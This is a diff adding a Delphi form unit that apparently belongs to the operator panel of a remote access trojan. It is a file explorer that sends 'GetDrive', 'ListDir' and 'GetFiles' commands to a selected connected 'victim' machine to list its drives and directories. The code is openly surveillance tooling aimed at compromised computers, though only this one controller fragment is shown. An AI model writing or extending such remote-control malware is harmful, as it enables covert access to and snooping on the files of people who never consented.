@@ -1,0 +1,70 @@
+unit FrmFileExplorer;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.StdCtrls;
+
+type
+  TForm21 = class(TForm)
+    PageControl1: TPageControl;
+    TabSheet1: TTabSheet;
+    GroupBox1: TGroupBox;
+    ComboBox1: TComboBox;
+    GroupBox2: TGroupBox;
+    Edit1: TEdit;
+    GroupBox3: TGroupBox;
+    Edit2: TEdit;
+    Button1: TButton;
+    ListView1: TListView;
+    ListView2: TListView;
+    StatusBar1: TStatusBar;
+    procedure FormCreate(Sender: TObject);
+    procedure ComboBox1Change(Sender: TObject);
+  private
+    { Private declarations }
+  public
+    ThisFormsVictimID: string;
+  end;
+
+var
+  Form21: TForm21;
+
+implementation
+
+{$R *.dfm}
+
+uses FrmMain;
+
+procedure SendToSelectedClient(const VictimID, Msg: string);
+var
+  I: Integer;
+  NickName: string;
+  UserData: TConnectedUserData;
+begin
+  NickName := VictimID;
+  for I := 0 to Form1.ConnectedUsers.Count - 1 do
+  begin
+    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
+    if UserData.ID = NickName then
+    begin
+      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
+      Exit;
+    end;
+  end;
+end;
+
+
+procedure TForm21.ComboBox1Change(Sender: TObject);
+begin
+ SendToSelectedClient(ThisFormsVictimID, 'GetFiles|' + Combobox1.Text);
+end;
+
+procedure TForm21.FormCreate(Sender: TObject);
+begin
+       SendToSelectedClient(ThisFormsVictimID, 'GetDrive|');
+             SendToSelectedClient(ThisFormsVictimID, 'ListDir|C:\');
+end;
+
+end.
